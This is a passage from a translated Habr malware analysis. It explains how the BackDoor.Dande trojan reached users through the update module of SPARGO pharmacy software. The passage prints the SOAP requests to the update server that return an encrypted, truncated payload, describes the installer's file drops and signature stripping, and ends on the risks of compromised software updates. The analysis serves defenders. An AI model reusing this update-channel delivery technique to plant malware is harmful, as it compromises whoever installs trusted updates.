class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.spargo.ru/es"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">LoginExResult</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SessionId</span></span></span><span class="hljs-tag">&gt;</span></span>64ad19a5-d8c3-481c-a95e-95ce9a3722ff<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SessionId</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">AccessCodeNew</span></span></span><span class="hljs-tag">&gt;</span></span>F06BBB44-558B-4C43-A278-1E7B787FE986<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">AccessCodeNew</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">ContentServiceUrl</span></span></span><span class="hljs-tag">&gt;</span></span>https://pharmadata.ru/content/ContentUploadService.asmx<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">ContentServiceUrl</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">PackSize</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">PackSize</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">MobOrderCheckIntervalSec</span></span></span><span class="hljs-tag">&gt;</span></span>300<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">MobOrderCheckIntervalSec</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">IsMobOrderDisabled</span></span></span><span class="hljs-tag">&gt;</span></span>false<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">IsMobOrderDisabled</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HasMobOrder</span></span></span><span class="hljs-tag">&gt;</span></span>false<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HasMobOrder</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">LastLogSave</span></span></span><span class="hljs-tag">&gt;</span></span>2016-12-08T12:41:44.0065516+03:00<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">LastLogSave</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">LoginExResult</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">LoginExResponse</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Envelope</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  To receive the payload, a request is sent to the server <a href="">ws.eprica.ru/app/UpdateService.asmx</a> with the following header: <br><br> <code>"SOAPAction": 'http://www.spargo.ru/es/Load'</code> <br> <br>  The following xml file is transmitted: <br><br><pre> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Envelope</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsd</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:soap</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Load</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.spargo.ru/es"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">guidSession</span></span></span><span class="hljs-tag">&gt;</span></span>%s<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">guidSession</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">offset</span></span></span><span class="hljs-tag">&gt;</span></span>%d<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">offset</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Load</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Envelope</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  The offset parameter is used because the file is given in parts.  The server response is as follows: <br><br><pre> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Envelope</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:soap</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsd</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">LoadResponse</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.spargo.ru/es"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">LoadResult</span></span></span><span class="hljs-tag">&gt;</span></span>fzzvOyrIohvnXggrGy35PtG9BG79/v7MebMKMMu+lN... <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">LoadResult</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">LoadResponse</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Envelope</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  The base64 transmitted payload is encrypted using the AES algorithm.  It contains the installer BackDoor.Dande.  The library itself has a valid SPARGO Technologies digital signature: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/9f2/608/953/9f2608953cd6c7f0d288b582d876359a.png"><br><br>  During the installation process, BackDoor.Dande deletes files from the old version of Dande: isaPnpPrt.sys, RpcSsPrt.sys, BackDoor.Dande.2.  The Trojan chooses a random name from the% SYSTEM32% \ drivers \ folder and saves its copy with the same name, but adds a few random characters to the end.  The Trojan extracts files for saving from the .cdata and .bdata sections; the data is stored in the BackDoor.Dande.2 container.  In the driver, which has SHA1 65384de87e53a9249553b6f38c9b48da3ec4e041, the name is updated to an encrypted container, thus removing the digital signature that was previously valid.  The rest of the installation procedure is similar to that for BackDoor.Dande.2. <br><br>  <a href="https://vms.drweb.ru/virus/%3Fi%3D15448691%26lng%3Dru">vms.drweb.ru/virus/?i=15448691&amp;lng=ru</a> <br><br><blockquote>  In other words, as in the situation with Trojan.Encoder.12544, the backdoor ‚Äúhid‚Äù in the update module of this program. <br><br>  The similarity of these two cases shows that the software development infrastructure requires increased attention to information security issues.  First of all, the process of updating any commercial software should be under the scrutiny of both the developers and users.  Update utilities of various programs that have the rights to install and run executable files in the operating system may unexpectedly become a source of infection.  In the case of MEDoc, the hackers and the compromising of the server from which the updates were downloaded hacked this way, and in the situation with BackDoor.Dande, experts believe that the conscious actions of insiders led to the spread of the infection.  Through this technique, attackers can conduct an effective targeted attack against users of almost any software. </blockquote></div><p>Source: <a href="https://habr.com/ru/post/332034/">https://habr.com/ru/post/332034/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../332024/index.html">Improving data quality with Oracle Enterprise Data Quality</a></li>
<li><a href="../332026/index.html">Libdispatch. How to make the application responsive</a></li>
<li><a href="../332028/index.html">How to choose a language to learn in 2017</a></li>
<li><a href="../332030/index.html">It would not be happy, but sports programming helped</a></li>
<li><a href="../332032/index.html">Another way to put tails on a USB flash drive (and get your gigabytes back)</a></li>
<li><a href="../332038/index.html">Native variables in CSS. It is time‚Ä¶</a></li>
<li><a href="../332042/index.html">Some thoughts on the Visitor pattern</a></li>
<li><a href="../332050/index.html">Security Week 26: ExPetr is not an extortionist, Intel PT allows you to bypass PatchGuard, in the Malware Protection Engine again RCE</a></li>
<li><a href="../332052/index.html">Symfony: Webpack Encore - plugin for resource management</a></li>
<li><a href="../332054/index.html">VK Streaming API Contest</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>